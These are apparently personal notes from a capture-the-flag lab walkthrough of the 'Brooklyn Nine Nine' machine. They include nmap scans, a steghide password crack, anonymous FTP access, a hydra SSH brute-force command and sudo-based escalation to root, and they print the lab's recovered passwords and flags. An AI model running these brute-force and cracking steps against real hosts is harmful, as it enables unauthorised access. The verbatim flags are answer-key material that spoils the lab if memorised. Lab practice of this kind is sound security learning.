---
title: brooklynNineNine
tags:
  - fetus
---
## nmap results:
- `Dscan.txt`:
```sh
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-14 10:11 EDT
Nmap scan report for 10.10.247.84
Host is up (0.24s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 56.01 seconds
```
- `nmap -p- -Pn -A -T4 10.10.247.84 > Ascan.txt`:
```sh
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-14 10:14 EDT
Warning: 10.10.247.84 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.247.84
Host is up (0.17s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
21/tcp    open     ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.21.154.145
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp    open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
17112/tcp filtered unknown
22851/tcp filtered unknown
44409/tcp filtered unknown
49829/tcp filtered unknown
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   183.92 ms 10.21.0.1
2   183.97 ms 10.10.247.84

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1326.05 seconds
```

### version enum: 

## http enum: 
theres this image in the root page: ![[brooklynNineNineRootImage.png]]
- theres a comment in the page source that says: 
```
<!-- Have you ever heard of steganography? -->
```
- im guessing theres something in the image. used [[wget]] to get the image and did `steghide info imagename` and it asked for a pass 
- used [[stegcracker]] to crack it
- output: 
```
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2025 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

Counting lines in wordlist..
Attacking file 'brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: admin
Tried 20715 passwords
Your file has been written to: brooklyn99.jpg.out
admin
```
- `brooklyn99.jpg.out:`
```
Holts Password:
fluffydog12@ninenine

Enjoy!!
```
- yaay new creds found: 
```
Holt:fluffydog12@ninenine
```
- im gonna run a dirbuster while i enumerate further 
### dirbusting results:
- `feroxbuster --url http://10.10.157.166/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
- nothing's showing up other than the root directory. im guessing this is all i get from this 
## ftp enum: 
- logged in as `anonymous:anonymous`
- theres a file called `note_to_jake.txt`
- got the file
- `note_to_jake.txt`:
```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
- sooooo we got three unames now:
```
jake
holt
amy
```
- and one password 
```
fluffydog12@ninenine
```
## ssh enum: 
- omg got in as holt
- `user.txt`:
```
ee11cbb19052e40b07aac0ca060c23ee
```
- did `sudo -l`
```
User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

- lets see if theres anything on `gtfobins`
- holy shit got root 
- got a reverse shell with [[rmOneLinerShell]]
- `root.txt`:
```
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
```
## ssh bruteforce: 
- gonna bruteforce jake as well cuz why not 
- `hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.157.166:22`
- `[22][ssh] host: 10.10.157.166   login: jake   password: 987654321`
- gonna log in as jake now
- did `sudo -l`:
```
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```
- lets see what `gtfobins` has for us
- got root yaaay